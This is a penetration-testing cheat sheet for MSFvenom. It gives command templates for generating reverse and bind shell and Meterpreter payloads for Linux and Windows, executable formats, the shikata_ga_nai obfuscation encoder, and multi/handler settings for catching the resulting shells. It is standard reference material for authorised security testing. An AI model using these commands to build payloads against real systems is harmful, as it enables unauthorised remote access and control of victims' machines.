---
layout: default
title: MSFvenom
tags:
    - bind
    - metasploit
    - meterpreter
    - msfpayload
    - obfuscation
    - reverse
    - shell
---
# MSFvenom
## General Reverse Shell Format
```shell
msfvenom -p <payload> LHOST=<local IP> LPORT=<local port> [-f <format>] [-e <encoder>] [-b <bad chars>] [-a <arch>] [--platform <platform>]
```
- For bind shells replace `LHOST=<local IP>` with `RHOST=<remote IP>`
- `-b` bad chars follows format such as `"\x00\x0D"`
- `EXITFUNC=<exit technique>`
    - `process` use where master process restarts on exit; use with multi/handler
    - `thread` *(default)*; use where shellcode runs in sub-thread; exit results in working system
    - `seh` use where a structured exception handler (SEH) restarts the thread or process on error
    - `none`

## Payloads
```shell
msfvenom -l payloads
```

### Linux
```shell
linux/x64/meterpreter/bind_tcp            # Bind Meterpreter
linux/x64/meterpreter_bind_tcp            # Bind Meterpreter (stageless)
linux/x64/meterpreter/reverse_tcp         # Reverse Meterpreter
linux/x64/meterpreter_reverse_tcp         # Reverse Meterpreter (stageless)

linux/x64/shell/bind_tcp                  # Bind shell
linux/x64/shell/reverse_tcp               # Reverse shell
```
- `x86` also available

### Windows
```shell
windows/x64/meterpreter/reverse_tcp       # Reverse Meterpreter
windows/x64/meterpreter_reverse_tcp       # Reverse Meterpreter (stageless)
windows/x64/meterpreter/bind_tcp          # Bind Meterpreter
windows/x64/meterpreter_bind_tcp          # Bind Meterpreter (stageless)

windows/x64/shell/reverse_tcp             # Reverse shell
windows/x64/shell_reverse_tcp             # Reverse shell (stageless)
windows/x64/shell/bind_tcp                # Bind shell
windows/x64/shell_bind_tcp                # Bind shell (stageless)

windows/x64/powershell_bind_tcp           # Bind PowerShell (stageless)
windows/x64/powershell_reverse_tcp        # Reverse PowerShell (stageless)

windows/x64/exec                          # Execute command; use CMD=<cmd>
```
- Remove `/x64` for x86

## Formats
```shell
msfvenom -l formats
```
### Executable
```shell
asp, aspx, dll, elf, exe, jar, jsp, msi, psh, vba, vbs, war
```

### Transform
```shell
bash, c, csharp, dword, hex, java, js_be, js_le, perl, powershell, python, raw, ruby, vbapplication, vbscript
```

## Encoders
```shell
msfvenom -l encoders
```
```shell
x86/shikata_ga_nai                        # Polymorphic XOR Additive Feedback Encoder
```
- `-i` for number of iterations

## Metasploit Handler
```shell
use exploit/multi/handler
set PAYLOAD <payload>
set RHOST <remote IP>
set LHOST <local IP>
set LPORT <local port>
run
```